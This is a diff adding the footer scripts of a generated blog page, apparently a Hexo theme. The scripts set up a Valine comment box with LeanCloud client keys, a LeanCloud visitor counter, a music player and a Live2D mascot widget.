+  var GUEST = ['nick', 'mail', 'link'];
+  var guest = 'nick,mail,link';
+  guest = guest.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#comments',
+    verify: false,
+    notify: false,
+    appId: 'yUAQJuIBNDcrV3CTNgWz9ptF-gzGzoHsz',
+    appKey: '85ji40bDRV2S4MEWoM3iXKP3',
+    placeholder: '你有什么想说的吗?',
+    avatar: 'mm',
+    meta: guest,
+    pageSize: '10' || 10,
+    visitor: false,
+    lang: '' || 'zh-cn'
+  });
+</script>
+
+
+
+
+  
+
+
+  
+
+
+
+
+  
+  
+  <script>
+    
+    function addCount(Counter) {
+      var $visitors = $('.leancloud_visitors');
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+
+      Counter('get', '/classes/Counter', { where: JSON.stringify({ url }) })
+        .done(function({ results }) {
+          if (results.length > 0) {
+            var counter = results[0];
+            
+            Counter('put', '/classes/Counter/' + counter.objectId, JSON.stringify({ time: { '__op': 'Increment', 'amount': 1 } }))
+            
+              .done(function() {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.time + 1);
+              })
+            
+              .fail(function ({ responseJSON }) {
+                console.log('Failed to save Visitor num, with error message: ' + responseJSON.error);
+              })
+          } else {
+            
+              var $element = $(document.getElementById(url));
+              $element.find('.leancloud-visitors-count').text('Counter not initialized! More info at console err msg.');
+              console.error('ATTENTION! LeanCloud counter has security bug, see how to solve it here: https://github.com/theme-next/hexo-leancloud-counter-security. \n However, you can still use LeanCloud without security, by setting `security` option to `false`.');
+            
+          }
+        })
+        .fail(function ({ responseJSON }) {
+          console.log('LeanCloud Counter Error: ' + responseJSON.code + ' ' + responseJSON.error);
+        });
+    }
+    
+
+    $(function() {
+      $.get('https://app-router.leancloud.cn/2/route?appId=' + 'yUAQJuIBNDcrV3CTNgWz9ptF-gzGzoHsz')
+        .done(function({ api_server }) {
+          var Counter = function(method, url, data) {
+            return $.ajax({
+              method: method,
+              url: 'https://' + api_server + '/1.1' + url,
+              headers: {
+                'X-LC-Id': 'yUAQJuIBNDcrV3CTNgWz9ptF-gzGzoHsz',
+                'X-LC-Key': '85ji40bDRV2S4MEWoM3iXKP3',
+                'Content-Type': 'application/json',
+              },
+              data: data
+            });
+          };
+          
+            addCount(Counter);
+          
+        });
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  <script src="https://cdn.bootcss.com/aplayer/1.6.0/APlayer.min.js"></script>
+
+<script src="https://api.i-meto.com/music/player.js"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body>
+</html>
